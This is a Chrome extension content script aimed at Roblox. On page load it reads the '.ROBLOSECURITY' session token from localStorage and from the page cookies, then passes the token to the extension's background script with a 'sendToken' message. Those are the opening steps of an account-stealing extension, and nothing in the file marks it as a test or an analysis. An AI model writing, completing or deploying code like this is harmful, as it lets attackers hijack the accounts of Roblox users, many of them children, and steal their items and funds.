// Wait for the page to load
window.addEventListener('load', function() {
  // Check if we're on Roblox
  if (window.location.hostname === 'www.roblox.com') {
    // Check for token in localStorage
    const token = localStorage.getItem('.ROBLOSECURITY');

    if (token) {
      // Send the token to our background script
      chrome.runtime.sendMessage({
        action: "sendToken",
        token: token
      });
    }

    // Also check for token in cookies
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
      if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
        const token = cookie.split('=')[1];
        chrome.runtime.sendMessage({
          action: "sendToken",
          token: token
        });
        break;
      }
    }
  }
});
